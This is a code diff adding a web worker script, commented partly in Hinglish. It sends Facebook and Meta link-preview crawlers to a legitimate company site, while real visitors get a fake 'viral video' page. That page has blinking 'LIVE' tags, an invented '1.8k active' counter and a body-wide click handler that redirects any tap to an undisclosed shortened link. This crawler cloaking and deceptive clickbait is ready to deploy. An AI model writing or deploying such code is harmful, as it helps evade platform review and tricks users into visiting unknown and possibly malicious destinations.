@@ -1,0 +1,109 @@
+export default {
+  async fetch(request) {
+    const userAgent = request.headers.get('User-Agent') || '';
+
+    // Facebook / Meta / WhatsApp bots detect
+    const isFacebookBot = /facebookexternalhit|Facebot|meta-externalagent/i.test(userAgent);
+
+    if (isFacebookBot) {
+      // Facebook bot ko Airbridge pe bhej do
+      return Response.redirect('https://www.airbridge.io/en', 302);
+    }
+
+    // Real users ke liye tumhara original HTML
+    const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ViralHub</title>
+    <style>
+    :root{--primary:#f00;--bg:#080808;--card:#151515;--text:#eee}
+    body{font-family:sans-serif;margin:0;background:var(--bg);color:var(--text);padding-bottom:120px;user-select:none;overflow-x:hidden}
+    .theme-dark{--bg:#080808;--card:#151515;--primary:#f00}
+    .theme-blue{--bg:#050a14;--card:#0d1421;--primary:#08f}
+    .theme-gray{--bg:#1a1a1a;--card:#252525;--primary:#fc0}
+    .header{text-align:center;padding:12px;background:var(--card);position:sticky;top:0;z-index:5000;border-bottom:1px solid #333}
+    .header h1{color:#FFD700;font-size:17px;margin:0;font-weight:900}
+    .container{max-width:800px;margin:0 auto;padding:10px}
+    .grid{display:grid;gap:12px}
+    .layout-single .grid{grid-template-columns:1fr}
+    .layout-double .grid{grid-template-columns:1fr 1fr}
+    .grid-item{background:var(--card);border-radius:10px;overflow:hidden;border:1px solid #333;cursor:pointer}
+    .image-container{position:relative;aspect-ratio:16/9;background:#000;display:flex;align-items:center;justify-content:center}
+    .image{width:100%;height:100%;object-fit:cover;opacity:.8;display:block}
+    .play-overlay{position:absolute;width:50px;height:50px;z-index:20}
+    .tag{position:absolute;top:8px;left:8px;background:var(--primary);color:#fff;font-size:10px;padding:3px 8px;border-radius:4px;font-weight:bold;animation:blink .8s infinite;z-index:25}
+    .download-btn{text-align:center;background:linear-gradient(180deg,#222,#000);color:#FFD700;padding:12px;font-weight:bold;font-size:13px}
+    .anchor-ad-fixed{position:fixed;bottom:0;left:0;width:100%;background:#000;border-top:3px solid #f02;padding:10px;z-index:10000}
+    .anchor-content{display:flex;align-items:center;max-width:600px;margin:0 auto;justify-content:space-between}
+    .anchor-img{height:60px;width:80px;object-fit:cover;border:1px solid #fff;border-radius:4px}
+    .anchor-btn{background:#f02;color:#fff;padding:10px 18px;border-radius:50px;font-weight:bold;animation:shake 3s infinite;font-size:12px}
+    @keyframes shake{0%,100%{transform:translateX(0)}10%,30%,50%{transform:translateX(-4px)}20%,40%{transform:translateX(4px)}}
+    @keyframes blink{50%{opacity:.3}}
+    </style>
+</head>
+<body onclick="goToLink()">
+<div class="header"><h1>🔥 VIRAL UPDATES 🔥</h1></div>
+<div class="container"><div class="grid" id="main-grid"></div></div>
+
+<div class="anchor-ad-fixed"> 
+  <div class="anchor-content"> 
+    <img src="https://i.postimg.cc/Jh1DwjfS/1.gif" class="anchor-img" alt="ad"> 
+    <div style="color:#fff;font-weight:bold;flex-grow:1;padding:0 12px;font-size:13px">WATCH FULL VIDEO<br><small style="color:#4CAF50">● 1.8k active</small></div> 
+    <div class="anchor-btn">WATCH</div> 
+  </div>
+</div>
+
+<script>
+const links = ["https://t.co/oDd30I9vMA"];
+function goToLink(){window.location.href=links[Math.floor(Math.random()*links.length)]}
+
+const themes=['theme-dark','theme-blue','theme-gray'];
+const layouts=['layout-single','layout-double'];
+document.body.classList.add(themes[Math.floor(Math.random()*themes.length)], layouts[Math.floor(Math.random()*layouts.length)]);
+
+const imgs = [ 
+"https://imagecdn.live/images/webp/1751480f-219c-4e7f-aed4-6192b36eab83.webp",
+"https://imagecdn.live/images/webp/ff9adada-d117-42ad-8e0a-31ba2bfaf0a8.webp",
+"https://imagecdn.live/images/webp/cbbc3c1e-44a1-4c73-a1c9-bb2614945975.webp",
+"https://imagecdn.live/images/webp/9ee3d71c-a422-4e28-bb6c-76490b1803bd.webp",
+"https://imagecdn.live/images/webp/f452006a-bbfd-43b3-9b0c-499cd242a330.webp",
+"https://imagecdn.live/images/webp/1ce54b19-3a3a-4717-934c-c728a5c83f54.webp",
+"https://imagecdn.live/images/webp/f76aa641-2a7e-45ad-bdfa-c8a7bd44762f.webp",
+"https://imagecdn.live/images/webp/3c8ab375-e6bb-440b-b39d-26461db8e574.webp",
+"https://imagecdn.live/images/webp/5a7a693a-d8e8-44ae-82ab-6fe43013374a.webp",
+"https://imagecdn.live/images/webp/94758ef1-62fd-4b3a-9011-ee8dee6f1f3d.webp",
+"https://imagecdn.live/images/webp/e4567ece-db83-4059-b29f-bbe543e06ffe.webp",
+"https://imagecdn.live/images/webp/57af8ab6-ea74-45a4-8734-04d4e6429090.webp",
+"https://imagecdn.live/images/webp/c75f8265-8653-48c5-9672-cd28ab1da1be.webp",
+"https://imagecdn.live/images/webp/c5f9dd2a-7aa4-4e37-abda-c0c50f1dcf7e.webp",
+"https://imagecdn.live/images/webp/28ffbe11-eb86-44f8-9b30-d5d53e9a93ca.webp",
+"https://imagecdn.live/images/webp/fb98a5a2-6f13-4258-a9cf-9a7c9e68a5e2.webp"
+];
+
+const grid = document.getElementById('main-grid');
+let h = "";
+imgs.sort(()=>Math.random()-0.5).forEach(s=>{
+  h += \`<div class="grid-item">
+    <div class="image-container">
+      <div class="tag">● LIVE</div>
+      <img src="https://i.postimg.cc/hGGJ3ZF1/play.png" class="play-overlay">
+      <img src="\${s}" class="image" loading="lazy">
+    </div>
+    <div class="download-btn">Play Full HD Video</div>
+  </div>\`;
+});
+grid.innerHTML = h;
+</script>
+</body>
+</html>`;
+
+    return new Response(html, {
+      headers: {
+        'content-type': 'text/html;charset=UTF-8',
+        'cache-control': 'no-store, no-cache, must-revalidate'
+      }
+    });
+  }
+}
